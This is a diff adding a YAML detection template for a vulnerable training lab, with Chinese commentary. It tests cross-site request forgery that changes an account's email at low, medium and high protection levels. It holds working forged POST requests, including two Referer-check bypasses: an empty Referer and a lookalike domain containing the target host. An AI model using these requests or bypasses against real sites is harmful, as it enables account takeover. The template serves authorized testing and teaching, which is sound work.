@@ -1,0 +1,213 @@
+id: vulnlab-csrf-state-change
+
+info:
+  name: CSRF（跨站请求伪造改邮箱）
+  severity: high
+  author: hediwen
+  tags: [csrf, session, referer-bypass, state-change]
+
+  description: |
+    状态变更接口没有验证「请求是不是本站发起的」，导致攻击者的页面
+    可以让受害者的浏览器替他发出请求 —— 而浏览器会自动带上受害者的 Cookie。
+
+    本 PoC 覆盖两种失效方式：
+      ① 完全不检查来源（low）
+      ② 只检查 Referer —— 而 Referer 是「客户端自愿提供」的信息（medium）
+         子绕过 2a：攻击者在页面里加 `<meta name="referrer" content="no-referrer">`
+                    就能让浏览器完全不带 Referer
+         子绕过 2b：代码用 `strpos` 做「包含」判断，攻击者只要注册一个
+                    *名字里含目标域名*的域名就能通过 —— 不需要伪造任何请求头
+
+    ⚠️ 本检测会真实改掉靶场里的一个演示字段（dummy 邮箱值）。
+    这是 CSRF 检测的固有性质：**不真的发一个跨站请求，就无法验证跨站请求有没有生效。**
+    载荷里的邮箱是本靶场专用的演示值（`attacker@evil.example`），
+    不涉及任何真实账号。
+
+    真实授权测试中应当：
+      · 只在明确授权的目标上做，并事先说明会做一次状态变更
+      · 使用可识别的标记值，便于目标方核对与回滚
+      · 只做一次，不要批量重放
+
+    ── 为什么判据是「本次请求的结果」而不是「页面当前状态」 ──
+    CSRF 攻击会真的改掉服务端状态，而「当前状态」一旦被改过就会一直保持。
+    如果判据写成「响应里出现某个值」，那么第二次运行 PoC 时会因为
+    **上一次的结果**而误判。
+
+    所以判据必须限定在**针对本次请求的那句结论**上：
+
+        上一次请求：<b>已修改</b>
+
+    这和前面几个场景的教训是同一条：
+    **判据要指向「这一次发生了什么」，而不是「现在是什么状态」。**
+
+  reference:
+    - https://owasp.org/www-community/attacks/csrf
+    - https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
+    - https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy
+
+requests:
+  # ── ① low 档：零防护 ────────────────────────────────────────────
+  #
+  # 一个来自 evil.example 的 POST，带着「把邮箱改成攻击者的地址」的字段。
+  # 服务器没有任何来源校验，直接照做。
+  #
+  # 这就是 CSRF 最朴素的形态：**攻击者不需要能访问目标站点，
+  # 也不需要读到任何响应** —— 他只需要让受害者的浏览器发出这个请求。
+  - method: POST
+    path:
+      - "{{BaseURL}}/csrf/low.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      # 刻意带上一个外部站点的 Referer，模拟「浏览器从攻击页面提交表单」
+      Referer: "http://evil.example/attack.html"
+    body: "email=attacker%40evil.example"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+
+      # 判据限定在「本次请求的结果」上，不看页面当前状态
+      - type: regex
+        part: body
+        regex:
+          - "上一次请求：<b>已修改</b>"
+
+      # 反向保险：被拒绝的响应不算命中
+      - type: word
+        part: body
+        words:
+          - "被拒绝"
+        negative: true
+
+    extractors:
+      - type: regex
+        part: body
+        name: changed_email
+        regex:
+          - "绑定邮箱</b><span class=\"mono\">([^<]*)</span>"
+
+  # ── ② medium 档 · 绕过一：不带 Referer ──────────────────────────
+  #
+  # 该档写着「Referer 为空 → 大概是用户直接访问 → 放行」。
+  # 这个推断的前提是「攻击者没法不发 Referer」——
+  # 而攻击者控制着自己页面的 HTML，当然也能控制浏览器发不发 Referer：
+  #
+  #     <meta name="referrer" content="no-referrer">
+  #
+  # 所以「空 Referer 放行」不是兼容性处理，而是一个**完整的绕过**。
+  #
+  # ⚠️ 注意本请求**故意不设置 Referer 头** —— 这就是攻击者页面
+  #    加上 no-referrer 之后，浏览器实际发出的请求长什么样。
+  - method: POST
+    path:
+      - "{{BaseURL}}/csrf/medium.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "email=attacker%40evil.example"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+
+      - type: regex
+        part: body
+        regex:
+          - "上一次请求：<b>已修改</b>"
+
+      - type: word
+        part: body
+        words:
+          - "被拒绝"
+        negative: true
+
+    extractors:
+      - type: regex
+        part: body
+        name: bypass_type
+        regex:
+          - "（未提供）"
+
+  # ── ③ medium 档 · 绕过二：Referer 子串包含 ──────────────────────
+  #
+  # 该档用 `strpos($referer, $host) !== false` 判断 ——
+  # 这是「包含」，不是「相等」。
+  #
+  # 真实场景：目标是 bank.com，攻击者注册 bank.com.evil.com，
+  # 浏览器诚实地填上 http://bank.com.evil.com/... ，检查通过。
+  # **攻击者不需要伪造任何请求头，只是买了个域名。**
+  #
+  # 靶场 host 是 127.0.0.1:8080，没法真的注册这种域名，
+  # 所以这里直接构造那个形状的 Referer，效果等价。
+  - method: POST
+    path:
+      - "{{BaseURL}}/csrf/medium.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      # 域名里「包含」了目标 host —— 但这是攻击者自己的域名
+      Referer: "http://127.0.0.1:8080.evil.example/attack.html"
+    body: "email=attacker%40evil.example"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+
+      - type: regex
+        part: body
+        regex:
+          - "上一次请求：<b>已修改</b>"
+
+      - type: word
+        part: body
+        words:
+          - "被拒绝"
+        negative: true
+
+  # ── ④ medium 档对照组：完全对不上的 Referer 应被拒绝 ─────────────
+  #
+  # 这一条**不应该命中**。它的作用是把「通过」归因给那两个绕过点：
+  # 证明该档的 Referer 检查确实在工作，不是「什么都不管」。
+  - method: POST
+    path:
+      - "{{BaseURL}}/csrf/medium.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Referer: "http://evil.example/attack.html"
+    body: "email=attacker%40evil.example"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+
+      - type: regex
+        part: body
+        regex:
+          - "上一次请求：<b>已修改</b>"
+
+  # ── ⑤ high 档：修复对照（预期不命中）────────────────────────────
+  #
+  # high 档要求提交一个只有本站页面才知道的 token ——
+  # 而攻击者的页面**读不到**那个 token（同源策略）。
+  #
+  # 所以同一条跨站载荷打过去会被直接拒绝。
+  # 这一条如果命中了，说明 token 校验被去掉了。
+  - method: POST
+    path:
+      - "{{BaseURL}}/csrf/high.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Referer: "http://evil.example/attack.html"
+    body: "email=attacker%40evil.example"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+
+      - type: regex
+        part: body
+        regex:
+          - "上一次请求：<b>已修改</b>"
